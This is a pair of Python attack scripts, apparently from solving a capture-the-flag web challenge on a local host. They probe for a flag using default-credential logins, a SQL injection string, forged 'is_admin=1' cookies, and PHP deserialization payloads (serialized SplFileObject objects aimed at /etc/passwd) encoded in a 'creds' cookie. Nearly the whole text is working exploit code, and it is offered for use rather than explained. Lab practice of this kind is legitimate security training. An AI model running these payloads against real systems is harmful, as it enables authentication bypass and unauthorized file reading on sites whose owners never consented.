import requests
import base64
import re

base_url = "http://127.0.0.1:32921/"

# Let me try to understand the application better
# Maybe the flag is in a file that we can read through error messages

print("[*] Testing file read through error messages...\n")

# Try to trigger errors that might reveal file contents
# SplFileObject can read files

# But first, let me check if there's any GET parameter that might help
print("[*] Checking for GET parameters...\n")

params_to_test = [
    {'debug': '1'},
    {'admin': '1'},
    {'flag': '1'},
    {'show_flag': '1'},
    {'source': '1'},
    {'file': '/etc/passwd'},
    {'page': 'admin'},
]

for params in params_to_test:
    resp = requests.get(base_url, params=params)
    
    if "FLAG" in resp.text or "flag{" in resp.text.lower():
        print(f"[!!!] Found flag with params {params}")
        flag_match = re.search(r'(FLAG\{[^}]+\})', resp.text, re.IGNORECASE)
        if flag_match:
            print(f"    FLAG: {flag_match.group(1)}")
    
    # Check if response differs significantly
    if len(resp.content) != 3188:
        print(f"[+] {params}: {len(resp.content)}B (different from baseline 3188B)")

print("\n" + "="*80 + "\n")

# Try POST requests
print("[*] Testing POST requests...\n")

post_data_tests = [
    {'username': 'admin', 'password': 'admin'},
    {'username': 'Burns', 'password': 'Burns'},
    {'username': "admin' OR '1'='1", 'password': 'x'},
    {'debug': '1'},
]

for data in post_data_tests:
    resp = requests.post(base_url, data=data)
    
    has_rejection = "you are not the admin" in resp.text
    
    print(f"    POST {data}: {len(resp.content)}B {'[REJECTED]' if has_rejection else '[BYPASSED]'}")
    
    if "FLAG" in resp.text or "flag{" in resp.text.lower():
        flag_match = re.search(r'(FLAG\{[^}]+\})', resp.text, re.IGNORECASE)
        if flag_match:
            print(f"    [!!!] FLAG: {flag_match.group(1)}")
    
    if not has_rejection:
        content = re.search(r'</form>(.*?)</body>', resp.text, re.DOTALL)
        if content:
            print(f"    Content: {content.group(1).strip()[:200]}")

print("\n" + "="*80 + "\n")

# Try SplFileObject with proper initialization
print("[*] Testing SplFileObject for file read...\n")

# SplFileObject constructor takes filename as argument
# When unserialized, it might try to open a file

# Format: O:13:"SplFileObject":1:{s:8:"filename";s:11:"/etc/passwd";}
# But SplFileObject uses __construct, so we need to use the right format

# In PHP 7+, SplFileObject has a private __filename property
spl_payloads = [
    ('SplFileObject_basic', 'O:13:"SplFileObject":1:{s:8:"filename";s:11:"/etc/passwd";}'),
    ('SplFileObject_file', 'O:13:"SplFileObject":1:{s:8:"\x00*\x00file";s:11:"/etc/passwd";}'),
]

for name, payload in spl_payloads:
    print(f"[*] Testing {name}...")
    
    payload_b64 = base64.b64encode(payload.encode()).decode()
    headers = {'Cookie': f'creds={payload_b64}; is_admin=1'}
    
    try:
        resp = requests.get(base_url, headers=headers, timeout=5)
        
        has_error = "Fatal error" in resp.text or "Warning" in resp.text
        has_rejection = "you are not the admin" in resp.text
        
        print(f"    Status: {len(resp.content)}B {'[ERROR]' if has_error else ''} {'[REJECTED]' if has_rejection else '[BYPASSED]'}")
        
        # Check for /etc/passwd content
        if "root:" in resp.text:
            print(f"    [!!!] File content detected!")
        
        if has_error:
            err_match = re.search(r'(<b>Fatal error</b>.*?<br />|<b>Warning</b>.*?<br />)', resp.text, re.DOTALL)
            if err_match:
                print(f"    Error: {err_match.group(1)[:200]}")
        
    except Exception as e:
        print(f"    Exception: {e}")
    
    print()

import requests
import base64
import re

base_url = "http://127.0.0.1:32921/"

print("[*] Detailed POST request analysis...\n")

# POST with various data
post_tests = [
    ('empty', {}),
    ('admin', {'username': 'admin', 'password': 'admin'}),
    ('Burns', {'username': 'Burns', 'password': 'Burns'}),
]

for name, data in post_tests:
    print(f"[*] POST {name}...")
    
    # Also include the creds cookie
    burn_payload = 'a:2:{s:8:"username";s:5:"Burns";s:8:"password";s:5:"Burns";}'
    burn_b64 = base64.b64encode(burn_payload.encode()).decode()
    
    headers = {'Cookie': f'creds={burn_b64}; is_admin=1'}
    resp = requests.post(base_url, data=data, headers=headers)
    
    print(f"    Status: {resp.status_code} | Length: {len(resp.content)}B")
    
    # Full response
    print(f"\n[+] FULL RESPONSE:\n")
    print(resp.text)
    
    # Check for flags
    flag_match = re.search(r'(FLAG\{[^}]+\})', resp.text, re.IGNORECASE)
    if flag_match:
        print(f"\n[!!!] FLAG FOUND: {flag_match.group(1)}")
    
    print("\n" + "="*80 + "\n")

# Also check what happens with POST and different cookie values
print("[*] Testing POST with different cookie combinations...\n")

cookie_tests = [
    ('no_cookies', ''),
    ('is_admin_only', 'is_admin=1'),
    ('creds_only', f'creds={burn_b64}'),
    ('both', f'creds={burn_b64}; is_admin=1'),
]

for name, cookie in cookie_tests:
    headers = {'Cookie': cookie} if cookie else {}
    resp = requests.post(base_url, data={'username': 'admin', 'password': 'admin'}, headers=headers)
    
    print(f"    {name}: {len(resp.content)}B")
    
    if "FLAG" in resp.text or "flag{" in resp.text.lower():
        print(f"    [!!!] FLAG found!")
        flag_match = re.search(r'(FLAG\{[^}]+\})', resp.text, re.IGNORECASE)
        if flag_match:
            print(f"    FLAG: {flag_match.group(1)}")

